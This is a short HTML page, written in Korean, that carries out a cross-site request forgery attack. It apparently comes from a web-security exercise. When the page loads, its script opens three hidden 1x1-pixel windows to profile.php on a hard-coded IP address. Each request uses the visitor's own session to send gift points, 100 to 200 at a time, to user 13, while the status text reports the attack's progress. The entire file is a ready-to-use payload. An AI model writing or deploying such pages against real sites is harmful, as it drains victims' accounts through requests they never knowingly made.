<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>자동 리다이렉트</title>
</head>
<body>
    <h1>🎯 자동 공격 진행 중...</h1>
    <p id="status">준비 중...</p>
    
    <script>
        const attacks = [
            'http://3.36.66.216/profile.php?send_gift=1&receiver_id=13&gift_type=coffee&points=100&message=auto1&gift_to=13',
            'http://3.36.66.216/profile.php?send_gift=1&receiver_id=13&gift_type=flower&points=150&message=auto2&gift_to=13',
            'http://3.36.66.216/profile.php?send_gift=1&receiver_id=13&gift_type=cake&points=200&message=auto3&gift_to=13'
        ];
        
        let currentAttack = 0;
        
        function nextAttack() {
            if (currentAttack < attacks.length) {
                document.getElementById('status').textContent = 
                    `공격 ${currentAttack + 1}/${attacks.length} 실행 중...`;
                
                // 새 창에서 공격 URL 열기
                window.open(attacks[currentAttack], `attack${currentAttack}`, 'width=1,height=1');
                currentAttack++;
                
                setTimeout(nextAttack, 3000); // 3초 후 다음 공격
            } else {
                document.getElementById('status').textContent = '🎉 모든 공격 완료!';
            }
        }
        
        // 3초 후 시작
        setTimeout(nextAttack, 3000);
    </script>
</body>
</html>
